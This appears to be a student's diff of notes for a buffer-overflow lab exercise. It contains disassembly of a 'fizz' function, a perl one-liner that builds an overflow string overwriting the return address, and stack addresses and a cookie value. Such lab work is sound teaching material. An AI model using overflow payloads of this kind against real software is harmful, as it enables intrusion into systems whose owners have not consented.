@@ -1,0 +1,31 @@
+08048c52 <fizz>:
+ 8048c52:       55                      push   %ebp
+ 8048c53:       89 e5                   mov    %esp,%ebp
+ 8048c55:       83 ec 18                sub    $0x18,%esp
+ 8048c58:       8b 45 08                mov    0x8(%ebp),%eax
+ 8048c5b:       3b 05 08 d1 04 08       cmp    0x804d108,%eax
+ 8048c61:       75 26                   jne    8048c89 <fizz+0x37>
+ 8048c63:       89 44 24 08             mov    %eax,0x8(%esp)
+ 8048c67:       c7 44 24 04 e6 a4 04    movl   $0x804a4e6,0x4(%esp)
+ 8048c6e:       08 
+ 8048c6f:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
+ 8048c76:       e8 45 fd ff ff          call   80489c0 <__printf_chk@plt>
+ 8048c7b:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
+ 8048c82:       e8 ff 06 00 00          call   8049386 <validate>
+ 8048c87:       eb 18                   jmp    8048ca1 <fizz+0x4f>
+ 8048c89:       89 44 24 08             mov    %eax,0x8(%esp)
+ 8048c8d:       c7 44 24 04 38 a3 04    movl   $0x804a338,0x4(%esp)
+ 8048c94:       08 
+ 8048c95:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
+ 8048c9c:       e8 1f fd ff ff          call   80489c0 <__printf_chk@plt>
+ 8048ca1:       c7 04 24 00 00 00 00    movl   $0x0,(%esp)
+ 8048ca8:       e8 53 fc ff ff          call   8048900 <exit@plt>
+
+unix> perl -e 'print "61 "x44, "52 8c 04 08 ", "BB "x4, "CC "x4 '>hexlevel1
+
+0x804d108  where my id is stored
+
+ebp addres  0x55683684 + 8 =  0x5568368c
+
+Cookie: 0x2f926fe9  
+
